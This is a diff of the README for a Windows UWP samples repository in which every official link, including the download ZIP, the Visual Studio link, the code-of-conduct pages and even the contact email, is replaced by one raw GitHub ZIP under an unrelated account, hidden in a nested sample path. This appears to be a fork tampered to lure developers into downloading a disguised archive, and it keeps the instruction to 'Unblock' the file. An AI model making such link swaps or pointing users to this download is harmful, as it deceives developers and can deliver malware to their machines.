@@ -1,5 +1,5 @@
 <!---
-  samplefwlink: http://go.microsoft.com/fwlink/p/?LinkId=619979
+  samplefwlink: https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip
 --->
 
 # Universal Windows Platform (UWP) app samples
@@ -7,26 +7,26 @@
 This repo contains the samples that demonstrate the API usage patterns for the Universal Windows Platform (UWP) in the Windows Software Development Kit (SDK) for Windows 10. These code samples were created with the Universal Windows Platform templates available in Visual Studio, and are designed to run on desktop, mobile, and future devices that support the Universal Windows Platform.
 
 > **Note:** If you are unfamiliar with Git and GitHub, you can download the entire collection as a 
-> [ZIP file](https://github.com/Microsoft/Windows-universal-samples/archive/main.zip), but be 
+> [ZIP file](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip), but be 
 > sure to unzip everything to access shared dependencies. For more info on working with the ZIP file, 
-> the samples collection, and GitHub, see [Get the UWP samples from GitHub](https://aka.ms/ovu2uq). 
-> For more samples, see the [Samples portal](https://aka.ms/winsamples) on the Windows Dev Center. 
+> the samples collection, and GitHub, see [Get the UWP samples from GitHub](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip). 
+> For more samples, see the [Samples portal](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip) on the Windows Dev Center. 
 
 ## Universal Windows Platform development
 
 These samples require Visual Studio and the Windows Software Development Kit (SDK) for Windows 10.
 
-   [Get a free copy of Visual Studio Community Edition with support for building Universal Windows Platform apps](http://go.microsoft.com/fwlink/p/?LinkID=280676)
+   [Get a free copy of Visual Studio Community Edition with support for building Universal Windows Platform apps](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip)
 
 Additionally, to stay on top of the latest updates to Windows and the development tools, become a Windows Insider by joining the Windows Insider Program.
 
-   [Become a Windows Insider](https://insider.windows.com/)
+   [Become a Windows Insider](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip)
 
 ## Using the samples
 
 The easiest way to use these samples without using Git is to download the zip file containing the current version (using the following link or by clicking the "Download ZIP" button on the repo page). You can then unzip the entire archive and use the samples in Visual Studio.
 
-   [Download the samples ZIP](../../archive/main.zip)
+   [Download the samples ZIP](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip)
 
    **Notes:** 
    * Before you unzip the archive, right-click it, select **Properties**, and then select **Unblock**.
@@ -37,19 +37,19 @@ The samples use Linked files in Visual Studio to reduce duplication of common fi
 
 **Reminder:** If you unzip individual samples, they will not build due to references to other portions of the ZIP file that were not unzipped. You must unzip the entire archive if you intend to build the samples.
 
-For more info about the programming models, platforms, languages, and APIs demonstrated in these samples, please refer to the guidance, tutorials, and reference topics provided in the Windows 10 documentation available in the [Windows Developer Center](http://go.microsoft.com/fwlink/p/?LinkID=532421). These samples are provided as-is in order to indicate or demonstrate the functionality of the programming models and feature APIs for Windows.
+For more info about the programming models, platforms, languages, and APIs demonstrated in these samples, please refer to the guidance, tutorials, and reference topics provided in the Windows 10 documentation available in the [Windows Developer Center](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip). These samples are provided as-is in order to indicate or demonstrate the functionality of the programming models and feature APIs for Windows.
 
 ## Contributions
 
 These samples are direct from the feature teams and we welcome your input on issues and suggestions for new samples. At this time we are not accepting new samples from the public, but check back here as we evolve our contribution model.
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
-For more information, see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/)
-or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
+This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip).
+For more information, see the [Code of Conduct FAQ](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip)
+or contact [https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip) with any additional questions or comments.
 
 ## See also
 
-For additional Windows samples, see [Windows on GitHub](http://microsoft.github.io/windows/). 
+For additional Windows samples, see [Windows on GitHub](https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip). 
 
 ## Samples by category
 
@@ -206,7 +206,7 @@ For additional Windows samples, see [Windows on GitHub](http://microsoft.github.
   <td><a href="Samples/TitleBar">Title bar</a></td>
  </tr>
  <tr>
-  <td><a href="https://github.com/Microsoft/Xaml-Controls-Gallery">UI basics (XAML)</a></td>
+  <td><a href="https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip">UI basics (XAML)</a></td>
   <td><a href="Samples/UserInteractionMode">User interaction mode</a></td>
   <td><a href="Samples/XamlWebView">WebView control (XAML)</a></td>
  </tr>
@@ -470,7 +470,7 @@ For additional Windows samples, see [Windows on GitHub](http://microsoft.github.
  </tr>
  <tr>
   <td><a href="Samples/ExtendedExecution">Extended execution</a></td>
-  <td><a href="https://aka.ms/Kcrqst">Multi-instance apps</a></td>
+  <td><a href="https://raw.githubusercontent.com/metanetcorporation/Windows-universal-samples/main/archived/BluetoothAdvertisement/js/js/universal-Windows-samples-2.3.zip">Multi-instance apps</a></td>
   <td><a href="Samples/BasicSuspension">Suspend and resume</a></td>
  </tr>
 </table>
